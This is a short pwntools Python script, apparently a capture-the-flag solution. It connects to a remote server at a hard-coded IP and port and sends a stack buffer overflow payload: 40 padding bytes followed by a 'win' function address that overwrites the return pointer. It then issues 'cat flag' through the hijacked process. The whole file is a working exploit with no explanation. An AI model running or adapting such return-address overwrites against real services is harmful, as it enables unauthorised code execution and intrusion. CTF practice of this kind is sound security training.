import pwn 


win_addr = int(0x0000000000401199).to_bytes(8, byteorder='little')
rip_off = 40

conn = pwn.connect("3.71.110.92", 30001)

conn.recv()
conn.sendline(b'A' * rip_off + win_addr)
print(conn.recv())

conn.sendline(b'cat flag')
print(conn.recv())

conn.close()